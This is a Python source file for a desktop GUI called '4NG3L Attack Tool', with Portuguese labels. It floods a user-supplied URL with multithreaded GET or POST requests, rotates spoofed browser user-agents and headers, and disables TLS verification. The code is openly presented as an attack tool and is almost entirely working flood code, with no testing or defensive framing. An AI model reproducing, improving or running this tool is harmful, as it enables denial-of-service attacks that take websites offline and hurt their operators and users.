import tkinter as tk
from tkinter import messagebox, scrolledtext
import requests
import random
import threading
from colorama import init
import urllib3

init()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
]

stop_attack = False
threads = []

def get_random_user_agent():
    return random.choice(user_agents)

def generate_headers():
    return {
        'User-Agent': get_random_user_agent(),
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    }

def log_message(message):
    """Função para logar mensagens no terminal dentro do GUI."""
    terminal_output.config(state=tk.NORMAL)
    terminal_output.insert(tk.END, message + "\n")
    terminal_output.see(tk.END)
    terminal_output.config(state=tk.DISABLED)

def clear_terminal():
    """Limpa o conteúdo do terminal"""
    terminal_output.config(state=tk.NORMAL)
    terminal_output.delete(1.0, tk.END)
    terminal_output.config(state=tk.DISABLED)

def slow_get(base_url, num_requests):
    global stop_attack
    for _ in range(num_requests):
        if stop_attack:
            break
        try:
            headers = generate_headers()
            response = requests.get(base_url, headers=headers)
            log_message(f"GET {base_url} | Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            log_message(f"Erro GET {base_url}: {e}")

def slow_post(base_url, num_requests):
    global stop_attack
    for _ in range(num_requests):
        if stop_attack:
            break
        try:
            headers = generate_headers()
            payloads = [{'param': random.randint(1, 100)}, {'param1': random.randint(1, 100), 'param2': 'test'}, {'data': 'some_data', 'info': random.random()}]
            data = random.choice(payloads)
            response = requests.post(base_url, headers=headers, data=data, verify=False)
            log_message(f"POST {base_url} | Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            log_message(f"Erro POST {base_url}: {e}")

def is_valid_url(url):
    return url.startswith(("http://", "https://"))

def start_attack():
    global stop_attack, threads
    stop_attack = False
    base_url = url_entry.get()
    num_requests = int(num_requests_entry.get())
    num_threads = int(num_threads_entry.get())
    method = method_var.get()

    if not is_valid_url(base_url):
        messagebox.showerror("Erro", "A URL deve começar com 'http://' ou 'https://'")
        return

    threads = []
    for _ in range(num_threads):
        if method == 'GET':
            thread = threading.Thread(target=slow_get, args=(base_url, num_requests))
        elif method == 'POST':
            thread = threading.Thread(target=slow_post, args=(base_url, num_requests))
        thread.start()
        threads.append(thread)

    check_threads()

def check_threads():
    """Verifica periodicamente o status das threads para manter a interface responsiva."""
    global threads
    if any(thread.is_alive() for thread in threads):
        root.after(100, check_threads)
    else:
        log_message("Todas as threads foram concluídas.")

def stop_attack():
    global stop_attack
    stop_attack = True
    log_message("Ataque parado.")

root = tk.Tk()
root.title("4NG3L Attack Tool")
root.geometry("600x500")
root.config(bg="#2e2e2e")

root.grid_rowconfigure(5, weight=1)
root.grid_columnconfigure(1, weight=1)

entry_bg_color = "#4e4e4e"
entry_fg_color = "#ffffff"
label_fg_color = "#f5f5f5"
button_bg_start = "#28a745"
button_bg_stop = "#dc3545"
button_fg_color = "#ffffff"
terminal_bg_color = "#1c1c1c"
terminal_fg_color = "#00ff00"
border_radius = 4 

def rounded_button(text, command, bg, fg):
    return tk.Button(root, text=text, command=command, bg=bg, fg=fg, font=('bold', 10), relief='flat', highlightthickness=0)

def rounded_entry(width):
    return tk.Entry(root, width=width, bg=entry_bg_color, fg=entry_fg_color, relief='flat', highlightthickness=0, font=('bold', 10))

tk.Label(root, text="URL:", bg="#2e2e2e", fg=label_fg_color, font=('bold', 10)).grid(row=0, column=0, sticky='w', padx=10, pady=5)
url_entry = rounded_entry(50)
url_entry.grid(row=0, column=1, padx=10, pady=5, sticky="ew")

tk.Label(root, text="Número de Solicitações:", bg="#2e2e2e", fg=label_fg_color, font=('bold', 10)).grid(row=1, column=0, sticky='w', padx=10, pady=5)
num_requests_entry = rounded_entry(20)
num_requests_entry.grid(row=1, column=1, padx=10, pady=5, sticky="ew")

tk.Label(root, text="Número de Threads:", bg="#2e2e2e", fg=label_fg_color, font=('bold', 10)).grid(row=2, column=0, sticky='w', padx=10, pady=5)
num_threads_entry = rounded_entry(20)
num_threads_entry.grid(row=2, column=1, padx=10, pady=5, sticky="ew")

tk.Label(root, text="Método HTTP:", bg="#2e2e2e", fg=label_fg_color, font=('bold', 10)).grid(row=3, column=0, sticky='w', padx=10, pady=5)
method_var = tk.StringVar(value="GET")
tk.Radiobutton(root, text="GET", variable=method_var, value="GET", bg="#2e2e2e", fg=label_fg_color, font=('bold', 10), selectcolor="#2e2e2e").grid(row=3, column=1, sticky='w')
tk.Radiobutton(root, text="POST", variable=method_var, value="POST", bg="#2e2e2e", fg=label_fg_color, font=('bold', 10), selectcolor="#2e2e2e").grid(row=3, column=1, sticky='e')

start_button = rounded_button("Iniciar", start_attack, button_bg_start, button_fg_color)
start_button.grid(row=4, column=0, padx=10, pady=10, sticky="ew")

stop_button = rounded_button("Parar", stop_attack, button_bg_stop, button_fg_color)
stop_button.grid(row=4, column=1, padx=10, pady=10, sticky="ew")

clear_button = rounded_button("Limpar Terminal", clear_terminal, "#ff9900", button_fg_color)
clear_button.grid(row=4, column=2, padx=10, pady=10, sticky="ew")

terminal_output = scrolledtext.ScrolledText(root, width=70, height=15, bg=terminal_bg_color, fg=terminal_fg_color, state=tk.DISABLED)
terminal_output.grid(row=5, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")

root.mainloop()
